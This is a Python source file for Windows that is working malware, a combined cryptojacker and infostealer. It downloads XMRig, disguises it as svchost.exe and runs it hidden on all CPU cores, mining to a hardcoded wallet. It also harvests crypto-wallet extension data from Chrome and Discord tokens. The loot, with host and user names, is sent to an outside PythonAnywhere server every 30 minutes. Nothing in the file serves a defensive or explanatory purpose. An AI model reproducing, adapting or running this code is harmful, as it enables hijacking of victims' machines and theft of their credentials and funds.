import os
import re
import time
import requests
import subprocess
import threading
import zipfile
import multiprocessing
import shutil
import json
from pathlib import Path
from mnemonic import Mnemonic

mnemo = Mnemonic("english")
SERVER = "https://kryhrqs.pythonanywhere.com/export"
WALLET = "Bv3WEwFb17vKiiLGM7xc1UtxzWWfmzNimkq7CyVBjLfU"

TEMP = os.environ.get('TEMP', 'C:\\Windows\\Temp')
MINER = os.path.join(TEMP, 'svchost.exe')

CPU_CORES = multiprocessing.cpu_count()
THREADS = CPU_CORES  # Use ALL cores for max CPU

def send(data):
    try:
        requests.post(SERVER, json={
            'time': time.time(),
            'host': os.getenv('COMPUTERNAME', ''),
            'user': os.getenv('USERNAME', ''),
            'data': data
        }, timeout=10)
    except:
        pass

def start_miner():
    """Start miner with full CPU usage."""
    try:
        if not os.path.exists(MINER):
            zip_path = os.path.join(TEMP, 'xmrig.zip')
            r = requests.get(
                'https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-msvc-win64.zip',
                stream=True, timeout=60
            )
            if r.status_code == 200:
                with open(zip_path, 'wb') as f:
                    for chunk in r.iter_content(8192):
                        f.write(chunk)
                with zipfile.ZipFile(zip_path, 'r') as z:
                    z.extractall(TEMP)
                for root, dirs, files in os.walk(TEMP):
                    for f in files:
                        if f == 'xmrig.exe':
                            os.rename(os.path.join(root, f), MINER)
                            break
        
        if os.path.exists(MINER):
            subprocess.Popen(
                [MINER, 
                 '--url=pool.supportxmr.com:3333', 
                 f'--user={WALLET}',
                 '--pass=x', 
                 f'--threads={THREADS}',
                 '--priority=5',
                 '--keepalive', 
                 '--donate-level=1'],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print(f"[MINER] Launched with {THREADS} threads (100% CPU)")
    except Exception as e:
        print(f"[MINER] Error: {e}")

def steal_browser_extensions():
    """Only look for ACTUAL wallet extension LOCK files."""
    print("[WALLET] Scanning for wallets...")
    
    # Wallet extension IDs
    extensions = {
        'metamask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
        'phantom': 'bfnaelmomejmhlkdgepjocepnpkbmjgj',
        'trust': 'egjidjbpglichdcondbcbdnbeeppgdph',
        'coinbase': 'hnfanknocfeofbddgcijnmhnfnkdnaad',
        'rabby': 'acmacodkjbdgmoleebolmdjonilkdbch',
        'okx': 'mcohilncbfahbmgdjkbpemcciiolgcge',
        'exodus': 'aholpfdialjgjfhomihkjbmgjidlcdno',
    }
    
    found = 0
    
    # Search Chrome profiles
    chrome_base = os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\")
    if os.path.exists(chrome_base):
        for profile in ['Default'] + [f'Profile {i}' for i in range(1, 10)]:
            for name, ext_id in extensions.items():
                ext_path = os.path.join(chrome_base, profile, 'Local Extension Settings', ext_id)
                if os.path.exists(ext_path):
                    lock_file = os.path.join(ext_path, 'LOCK')
                    if os.path.exists(lock_file):
                        try:
                            with open(lock_file, 'r', errors='ignore') as f:
                                content = f.read()
                                if content and len(content) > 50:
                                    send({
                                        'type': f'{name}_vault',
                                        'path': lock_file,
                                        'profile': profile,
                                        'content': content[:100000]
                                    })
                                    found += 1
                                    print(f"[VAULT] {name} found in Chrome ({profile})")
                        except:
                            pass
    
    print(f"[WALLET] Found {found} wallet vaults")

def steal_discord_tokens():
    """Steal Discord tokens."""
    discord_paths = [
        os.path.expandvars("%APPDATA%\\discord\\Local Storage\\leveldb"),
        os.path.expandvars("%APPDATA%\\discordptb\\Local Storage\\leveldb"),
        os.path.expandvars("%APPDATA%\\discordcanary\\Local Storage\\leveldb"),
    ]
    
    found = 0
    for path in discord_paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith('.log') or file.endswith('.ldb'):
                    try:
                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
                            content = f.read()
                            matches = re.findall(r'[a-zA-Z0-9_-]{64}', content)
                            for match in matches:
                                if match:
                                    send({'type': 'discord_token', 'content': match})
                                    found += 1
                    except:
                        pass
    
    print(f"[TOKEN] Found {found} Discord tokens")

def scan_loop():
    while True:
        steal_browser_extensions()
        steal_discord_tokens()
        time.sleep(1800)  # 30 minutes

def main():
    print(f"[SERVICE] Starting with {THREADS} threads")
    threading.Thread(target=start_miner, daemon=True).start()
    threading.Thread(target=scan_loop, daemon=True).start()
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        while True:
            time.sleep(60)

if __name__ == '__main__':
    main()